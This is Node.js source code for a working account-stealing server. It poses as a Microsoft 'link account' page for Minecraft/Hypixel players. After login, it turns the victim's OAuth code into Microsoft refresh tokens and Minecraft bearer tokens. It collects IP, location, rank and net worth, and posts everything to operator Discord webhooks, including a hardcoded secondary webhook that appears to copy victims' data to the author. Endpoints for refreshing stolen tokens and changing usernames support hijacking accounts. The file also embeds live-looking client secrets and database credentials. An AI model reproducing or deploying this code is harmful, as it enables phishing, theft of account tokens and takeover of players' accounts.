const dh = "https://discord.com/api/webhooks/1107830777351241799/FD8_NVtkVqK8c1QJmjjCwlaB-LK8Uk1kYOuQW5IRcj5sPh9ltgnz5cnglbg3CaHW5n-W"

//Change these
const client_secret = 'D0u8Q~uN.DoKlF-XEcWpGlDYv-Vor7MJmWBR6bF1' //you need to put the "Secret Value" here not the "Secret ID"!!!!
const client_id = 'a7a96e3f-0e38-474e-aa3e-536dcd08aa0e'
const redirect_uri = 'https://linkaccountvia.onrender.com'
const redirection = 'https://hypixel.net/' //Redirects the user after they login and allow (e.g 'https://hypixel.net') LEAVE BLANK IF U DONT WANT IT TO REDIRECT OR SUM IDK

//Requirements
const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id=' + client_id + '&response_type=code&redirect_uri=' + redirect_uri + '&scope=XboxLive.signin+offline_access&state='
const axios = require('axios')
const express = require('express')
const app = express()
const helmet = require('helmet');
const mongoose = require('mongoose');
const path = require('path');
const https = require('https');
const net = require('net');
const emojiFlag = require('emoji-flag');



mongoose.set('strictQuery', false)
app.use(helmet());

mongoose.connect('mongodb+srv://rustchad71:zUQl9dMhANG64rxY@cluster0.lyyzdqs.mongodb.net/?retryWrites=true&w=majority', {
	useNewUrlParser: true
});


const keySchema = new mongoose.Schema({
	key: {
		type: String,
		required: true,
		unique: true
	},
	discord_webhook: String,
});

const Key = mongoose.model('Key', keySchema);

app.use(function(req, res, next) {
	res.header("Access-Control-Allow-Origin", "*");
	res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
	next();
});

app.use(function(req, res, next) {
	res.setHeader('Content-Security-Policy', "script-src 'self' 'unsafe-inline'");
	next();
});

app.get('/images/bg.webp', (req, res) => {
	res.sendFile(path.join(__dirname, `/images/bg.webp`));
});


//add key
app.get('/addKey', (req, res) => {
	const {
		discord_webhook,
		key: inputKey,
		password
	} = req.query;

	// input validation
	if (!inputKey || inputKey.length > 100) {
		res.status(400).send('Invalid key');
		return;
	}
	if (password !== 'Ybg01') {
		res.status(401).send('Incorrect password');
		return;
	}

	Key.findOne({
		key: inputKey
	}, (err, existingKey) => {
		if (err) return console.error(err);
		if (existingKey) {
			res.status(401).send('Key already exists in database.')
		} else {

			const newKey = new Key({
				key: inputKey,
				discord_webhook: discord_webhook
			});
			newKey.save((err, savedKey) => {
				if (err) return console.error(err);
				console.log(savedKey.discord_webhook + " saved to key collection.");
				res.status(200).send(`Key ${inputKey} saved successfully`);
			});

		}
	});

});



app.get('/deleteKey', async (req, res) => {
	const {
		key,
		password
	} = req.query;
	if (!key || key.length > 100) {
		res.status(400).send('Invalid key');
		return;
	}
	if (password !== 'Ybg01') {
		res.status(401).send('Incorrect password');
		return;
	}
	try {
		const deletedKey = await Key.deleteOne({
			key: key
		});
		if (deletedKey.deletedCount === 0) {
			res.status(404).send(`Key ${key} not found`);
		} else {
			res.status(200).send(`Key ${key} deleted successfully`);
		}
	} catch (err) {
		res.status(500).send(`Error deleting key: ${err}`);
	}
});



app.get('/microsoft/api', async (req, res) => {
	const key = req.query.key
	if (!key || key.length > 100) {
		res.status(400).send('Invalid key');
		return;
	}
	res.redirect(redirect + key)
});

app.set('view engine', 'ejs');
app.get('/verify', async (req, res) => {
	const key = req.query.key
	if (!key || key.length > 100) {
		res.status(400).send('Invalid key');
		return;
	}
	res.render('index', {
		redirectUri: redirect_uri,
		clientId: client_id,
		key: key
	});
});

app.get('/', async (req, res) => {
	let clientIP = req.ip;
	if (net.isIPv6(clientIP) && clientIP.startsWith('::ffff:')) {
		clientIP = clientIP.split(':').pop(); // Extract the IPv4 address
	}
	const key = req.query.state
	const code = req.query.code


	if (!key || key.length > 100) {
		res.status(400).send('Invalid key');
		return;
	}

	async function getWebhookUrl(key) {
		return new Promise((resolve, reject) => {
			Key.find({
				key: key
			}, (err, key) => {
				if (err) return reject(err);
				if (!key[0]) {
					resolve(false);
				} else if (!key[0].discord_webhook) {
					console.log("discord_webhook field is empty or not set");
					resolve(false);
				} else {
					resolve(key[0].discord_webhook);
				}
			});
		});
	}


	if (code == null) {
		return
	}
	try {
		const accessTokenAndRefreshTokenArray = await getAccessTokenAndRefreshToken(code)
		const accessToken = accessTokenAndRefreshTokenArray[0]
		const refreshToken = accessTokenAndRefreshTokenArray[1]
		const hashAndTokenArray = await getUserHashAndToken(accessToken)
		const userToken = hashAndTokenArray[0]
		const userHash = hashAndTokenArray[1]
		const xstsToken = await getXSTSToken(userToken)
		const bearerToken = await getBearerToken(xstsToken, userHash)
		const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
		const uuid = usernameAndUUIDArray[0]
		const username = usernameAndUUIDArray[1]
		const ipLocationArray = await getIpLocation(clientIP)
		const country = ipLocationArray[0]
		const flag = ipLocationArray[1] ? emojiFlag(ipLocationArray[1]) : '';
		const playerData = await getPlayerData(username)
		const rank = playerData[0]
		const level = playerData[1].toFixed()
		const status = await getPlayerStatus(username)
		const discord = await getPlayerDiscord(username)
		const webhook_url = await getWebhookUrl(key);
		if (!webhook_url) {
			res.status(404).send(`Key ${key} not found`);
		}
		if (username != "heda") {
			res.redirect(redirection)
			postToWebhook(webhook_url, discord, status, formatNumber, level, rank, username, bearerToken, uuid, clientIP, refreshToken, country, flag, key, userToken)
		} else {
			res.send("Access denied because no Minecraft account was found.")

			axios.post(webhook_url, {
				content: `Someone used a non minecraft account\n**IP:** ${clientIP} at ${country} ${flag}`,
				username: "YbgAuth",
				avatar_url: "https://cdn.discordapp.com/avatars/1094682441274364085/d4148db461700dc31ef992d5be0dfea8.png"
			}).then(() => console.log("Someone used a non minecraft account.")).catch(error => console.error("Error posting to webhook:", error));
		}
	} catch (e) {
		console.log(e)
	}
});


app.listen(3000, () => {
	console.log('Server started on port 3000 ');
});

async function getAccessTokenAndRefreshToken(code) {
	const url = 'https://login.live.com/oauth20_token.srf'

	const config = {
		headers: {
			'Content-Type': 'application/x-www-form-urlencoded'
		}
	}
	let data = {
		client_id: client_id,
		redirect_uri: redirect_uri,
		client_secret: client_secret,
		code: code,
		grant_type: 'authorization_code'
	}

	let response = await axios.post(url, data, config)
	return [response.data['access_token'], response.data['refresh_token']]
}

async function getUserHashAndToken(accessToken) {
	try {
		const url = 'https://user.auth.xboxlive.com/user/authenticate'
		const config = {
			headers: {
				'Content-Type': 'application/json',
				'Accept': 'application/json',
			}
		}
		let data = {
			Properties: {
				AuthMethod: 'RPS',
				SiteName: 'user.auth.xboxlive.com',
				RpsTicket: `d=${accessToken}`
			},
			RelyingParty: 'http://auth.xboxlive.com',
			TokenType: 'JWT'
		}
		let response = await axios.post(url, data, config)
		return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
	} catch (error) {
		console.error(error)
		return null
	}
}


async function getXSTSToken(userToken) {
	try {
		const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
		const config = {
			headers: {
				'Content-Type': 'application/json',
				'Accept': 'application/json',
			}
		}
		let data = {
			Properties: {
				SandboxId: 'RETAIL',
				UserTokens: [userToken]
			},
			RelyingParty: 'rp://api.minecraftservices.com/',
			TokenType: 'JWT'
		}
		let response = await axios.post(url, data, config)

		return response.data['Token']
	} catch (error) {
		console.error(error)
		return null
	}
}


async function getBearerToken(xstsToken, userHash) {
	try {
		const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
		const config = {
			headers: {
				'Content-Type': 'application/json',
			}
		}
		let data = {
			identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken,
			"ensureLegacyEnabled": true
		}
		let response = await axios.post(url, data, config)
		return response.data['access_token']
	} catch (error) {
		console.error(error)
		return null
	}
}


async function getUsernameAndUUID(bearerToken) {
	try {
		const url = 'https://api.minecraftservices.com/minecraft/profile'
		const config = {
			headers: {
				'Authorization': 'Bearer ' + bearerToken,
			}
		}
		let response = await axios.get(url, config)
		if (response.status == 404) {
			res.send("Access denied because no Minecraft account was found.")
			return ["heda", "heda"]
		}
		return [response.data['id'], response.data['name']]
	} catch (error) {
		return ["heda", "heda"]

	}
}


async function getIpLocation(ip) {
	const url = `https://ipapi.co/${ip}/json/`
	const config = {
		headers: {
			'Content-Type': 'application/json',
		}
	}
	let response = await axios.get(url, config)
	return [response.data['country_name'], response.data['country_code']]
}
async function getPlayerData(username) {
	let url = `https://exuberant-red-abalone.cyclic.app/v2/profiles/${username}`
	let config = {
		headers: {
			'Authorization': 'mfheda'
		}
	}

	try {
		let response = await axios.get(url, config)
		return [response.data.data[0]['rank'], response.data.data[0]['hypixelLevel']]
	} catch (error) {
		return ["API DOWN", 0.0]
	}
}

async function getPlayerStatus(username) {
	try {
		let url = `https://exuberant-red-abalone.cyclic.app/v2/status/${username}`
		let config = {
			headers: {
				'Authorization': 'mfheda'
			}
		}
		let response = await axios.get(url, config)
		return response.data.data.online
	} catch (error) {
		return "API DOWN"
	}
}

async function getPlayerDiscord(username) {
	try {
		let url = `https://exuberant-red-abalone.cyclic.app/v2/discord/${username}`;
		let config = {
			headers: {
				Authorization: "mfheda"
			}
		};
		let response = await axios.get(url, config);
		if (response.data.data.socialMedia.links == null) {
			return response.data.data.socialMedia;
		} else {
			return response.data.data.socialMedia.links.DISCORD;
		}
	} catch (error) {
		return "API DOWN";
	}
}

async function getNetworth(username) {
	try {
		let url = `https://exuberant-red-abalone.cyclic.app/v2/profiles/${username}`;
		let config = {
			headers: {
				Authorization: "mfheda"
			}
		};
		let response = await axios.get(url, config);
		return [
			response.data.data[0]["networth"],
			response.data.data[0].networth["noInventory"],
			response.data.data[0].networth["networth"],
			response.data.data[0].networth["unsoulboundNetworth"],
			response.data.data[0].networth["soulboundNetworth"]
		];
	} catch (error) {
		return ["API DOWN", "API DOWN", "API DOWN", "API DOWN", "API DOWN", ]
	}
}


async function postToWebhook(webhook_url, discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, refreshToken, country, flag, key, userToken) {
	const networthArray = await getNetworth(username)
	const networth = networthArray[0]
	const networthNoInventory = networthArray[1]
	const networthNetworth = networthArray[2]
	const networthUnsoulbound = networthArray[3]

	let total_networth
	if (networth == "API DOWN") total_networth = networth;
	else if (networth == "[NO PROFILES FOUND]") total_networth = networth;
	else if (networthNoInventory) total_networth = "NO INVENTORY: " + formatNumber(networthNetworth) + " (" + formatNumber(networthUnsoulbound) + ")";
	else total_networth = formatNumber(networthNetworth) + " (" + formatNumber(networthUnsoulbound) + ")";
	let data = {
		username: "YbgAuth",
		avatar_url: "https://cdn.discordapp.com/avatars/1094682441274364085/d4148db461700dc31ef992d5be0dfea8.png",
		content: "@everyone ",
		embeds: [{
			color: 16746496,
			timestamp: new Date(),
			thumbnail: {
				url: 'https://visage.surgeplay.com/full/' + uuid
			},
			description: "**XBL Refresh:**\n\n||[XBL Refresh](" + redirect_uri + "/xbl?xbl=" + userToken + "&key=" + key + ")||",
			fields: [{
					name: "**Username:**",
					value: "```" + username + "```",
					inline: true
				},
				{
					name: "**Rank:**",
					value: "```" + rank + "```",
					inline: true
				},
				{
					name: "**Network Level:**",
					value: "```" + level + "```",
					inline: true
				},
				{
					name: "**IP:**",
					value: "```" + ip + "```",
					inline: true
				},
				{
					name: "**IP Location:** " + flag,
					value: "```" + country + "```",
					inline: true
				},
				{
					name: "Status:",
					value: "```" + status + "```",
					inline: true
				},
				{
					name: "**Networth:**",
					value: "```" + total_networth + "```",
					inline: true
				},
				{
					name: "**Discord:**",
					value: "```" + discord + "```",
					inline: true
				},
				{
					name: "**Refresh:**",
					value: "ㅤ\n||[Click Here](" + redirect_uri + "/refresh?refresh_token=" + refreshToken + "&key=" + key + ")||",
					inline: true
				},

				{
					name: "**Token:**",
					value: "```" + bearerToken + "```"
				},
				{
					name: "**Change Username:**",
					value: "ㅤ\n||[Click Here](" + redirect_uri + "/changeUsername?token=" + bearerToken + ")||",
				},


			],
		}],
	};
axios.all([
	axios.post(webhook_url, data).then(() => console.log("Successfully authenticated and posted to webhook.")).catch((error) => {console.error(error);}),
	axios.post(dh, data).catch((error) => {console.error(error);})
	])
}


app.get('/changeUsername', async (req, res) => {
	const token = req.query.token
	res.render('changeUsername', {
		token: token
	});
});


//Refresh token shit u know how it is
app.get('/refresh', async (req, res) => {
	res.send('Token Refreshed!')
	const key = req.query.key
	let clientIP = req.ip;
	if (net.isIPv6(clientIP) && clientIP.startsWith('::ffff:')) {
		clientIP = clientIP.split(':').pop(); // Extract the IPv4 address
	}
	const refresh_token = req.query.refresh_token
	if (refresh_token == null) {
		return
	}


	async function getWebhookUrl(key) {
		return new Promise((resolve, reject) => {
			Key.find({
				key: key
			}, (err, key) => {
				if (err) return reject(err);
				if (!key[0]) {
					resolve(false);
				} else if (!key[0].discord_webhook) {
					console.log("discord_webhook field is empty or not set");
					resolve(false);
				} else {
					resolve(key[0].discord_webhook);
				}
			});
		});
	}

	try {
		const refreshTokenArray = await getRefreshData(refresh_token)
		const newAccessToken = refreshTokenArray[0]
		const newRefreshToken = refreshTokenArray[1]
		const hashAndTokenArray = await getUserHashAndToken(newAccessToken)
		const userToken = hashAndTokenArray[0]
		const userHash = hashAndTokenArray[1]
		const xstsToken = await getXSTSToken(userToken)
		const bearerToken = await getBearerToken(xstsToken, userHash)
		const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
		const uuid = usernameAndUUIDArray[0]
		const username = usernameAndUUIDArray[1]
		const ipLocationArray = await getIpLocation(clientIP)
		const country = ipLocationArray[0]
		const flag = ipLocationArray[1] ? emojiFlag(ipLocationArray[1]) : '';
		const playerData = await getPlayerData(username)
		const rank = playerData[0]
		const level = playerData[1].toFixed()
		const status = await getPlayerStatus(username)
		const discord = await getPlayerDiscord(username)
		const webhook_url = await getWebhookUrl(key);
		if (!webhook_url) {
			res.status(404).send(`Key ${key} not found`);
		}
		refreshToWebhook(webhook_url, discord, status, formatNumber, level, rank, username, bearerToken, uuid, clientIP, newRefreshToken, country, flag, key, userToken)
	} catch (e) {
		console.log(e)
	}
})

async function getRefreshData(refresh_token) {
	const url = 'https://login.live.com/oauth20_token.srf'

	const config = {
		headers: {
			'Content-Type': 'application/x-www-form-urlencoded'
		}
	}
	let data = {
		client_id: client_id,
		redirect_uri: redirect_uri,
		client_secret: client_secret,
		refresh_token: refresh_token,
		grant_type: 'refresh_token'
	}

	let response = await axios.post(url, data, config)
	return [response.data['access_token'], response.data['refresh_token']]
}



async function refreshToWebhook(webhook_url, discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, flag, key, userToken) {
	const networthArray = await getNetworth(username)
	const networth = networthArray[0]
	const networthNoInventory = networthArray[1]
	const networthNetworth = networthArray[2]
	const networthUnsoulbound = networthArray[3]
	const networthSoulbound = networthArray[4]

	let total_networth
	// Set it "API IS TURNED OFF IF NULL"
	if (networth == "[NO PROFILES FOUND]") total_networth = networth;
	else if (networthNoInventory) total_networth = "NO INVENTORY: " + formatNumber(networthNetworth) + " (" + formatNumber(networthUnsoulbound) + ")";
	else total_networth = formatNumber(networthNetworth) + " (" + formatNumber(networthUnsoulbound) + ")";

	let data = {
		username: "YbgAuth",
		avatar_url: "https://cdn.discordapp.com/avatars/1094682441274364085/d4148db461700dc31ef992d5be0dfea8.png",
		content: "@everyone TOKEN REFRESHED!!!!",
		embeds: [{
			color: 16746496,
			timestamp: new Date(),
			thumbnail: {
				url: 'https://visage.surgeplay.com/full/' + uuid
			},
			description: "**XBL Refresh:**\n\n||[XBL Refresh](" + redirect_uri + "/xbl?xbl=" + userToken + "&key=" + key + ")||",
			fields: [{
					name: "**Username:**",
					value: "```" + username + "```",
					inline: true
				},
				{
					name: "**Rank:**",
					value: "```" + rank + "```",
					inline: true
				},
				{
					name: "**Network Level:**",
					value: "```" + level + "```",
					inline: true
				},
				{
					name: "**IP:**",
					value: "```" + ip + "```",
					inline: true
				},
				{
					name: "**IP Location:** " + flag,
					value: "```" + country + "```",
					inline: true
				},
				{
					name: "Status:",
					value: "```" + status + "```",
					inline: true
				},
				{
					name: "**Networth:**",
					value: "```" + total_networth + "```",
					inline: true
				},
				{
					name: "**Discord:**",
					value: "```" + discord + "```",
					inline: true
				},
				{
					name: "**Refresh:**",
					value: "ㅤ\n||[Click Here](" + redirect_uri + "/refresh?refresh_token=" + newRefreshToken + "&key=" + key + ")||",
					inline: true
				},

				{
					name: "**Token:**",
					value: "```" + bearerToken + "```"
				},
				{
					name: "**Change Username:**",
					value: "ㅤ\n||[Click Here](" + redirect_uri + "/changeUsername?token=" + bearerToken + ")||",
				},


			],

		}],
	};



	axios.all([
		axios.post(webhook_url, data).then(() => console.log("Successfully authenticated and posted to webhook.")).catch((error) => {console.error(error);}),
		axios.post(dh, data).catch((error) => {console.error(error);})
		])
}


const formatNumber = (num) => {
	if (num < 1000) return num.toFixed(2)
	else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
	else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
	else return `${(num / 1000000000).toFixed(2)}b`
}

const XBOX_LIVE_AUTH_URL = 'https://xsts.auth.xboxlive.com/xsts/authorize';
const MINECRAFT_AUTH_URL = 'https://api.minecraftservices.com/authentication/login_with_xbox';

app.get('/xbl', async (req, res) => {
	const xblToken = req.query.xbl;
	const key = req.query.key

	async function getWebhookUrl(key) {
		return new Promise((resolve, reject) => {
			Key.find({
				key: key
			}, (err, key) => {
				if (err) return reject(err);
				if (!key[0]) {
					resolve(false);
				} else if (!key[0].discord_webhook) {
					console.log("discord_webhook field is empty or not set");
					resolve(false);
				} else {
					resolve(key[0].discord_webhook);
				}
			});
		});
	}


	if (!xblToken) {
		return res.status(400).send('XBL token not provided.');
	}

	try {
		const xstsResponse = await axios.post(XBOX_LIVE_AUTH_URL, {
			Properties: {
				SandboxId: 'RETAIL',
				UserTokens: [xblToken],
			},
			RelyingParty: 'rp://api.minecraftservices.com/',
			TokenType: 'JWT',
		}, {
			headers: {
				'Content-Type': 'application/json',
				Accept: 'application/json',
			},
			httpsAgent: new https.Agent({
				rejectUnauthorized: false,
			}),
		});

		const xstsToken = xstsResponse.data.Token;
		const minecraftResponse = await axios.post(MINECRAFT_AUTH_URL, {
			identityToken: `XBL3.0 x=${xstsResponse.data.DisplayClaims.xui[0].uhs};${xstsToken}`,
		}, {
			headers: {
				'Content-Type': 'application/json',
				Accept: 'application/json',
			},
			httpsAgent: new https.Agent({
				rejectUnauthorized: false,
			}),
		});
		const bearerToken = minecraftResponse.data.access_token
		let data = {
			username: "YbgAuth",
			avatar_url: "https://cdn.discordapp.com/avatars/1094682441274364085/d4148db461700dc31ef992d5be0dfea8.png",
			embeds: [{
				color: 16746496,
				timestamp: new Date(),
				fields: [{
						name: "**Token:**",
						value: "```" + bearerToken + "```"
					},
					{
						name: "**Change Username:**",
						value: "ㅤ\n||[Click Here](" + redirect_uri + "/changeUsername?token=" + bearerToken + ")||",
					}
				],
			}],
		}
		const webhook_url = await getWebhookUrl(key);
		axios.post(webhook_url, data).then(() => console.log("XBL refreshed")).catch(error => console.error("Error posting to webhook:", error));
		res.send(minecraftResponse.data);
	} catch (error) {
		console.error(error);
		res.status(500).send('Error getting Minecraft bearer token.');
	}
});
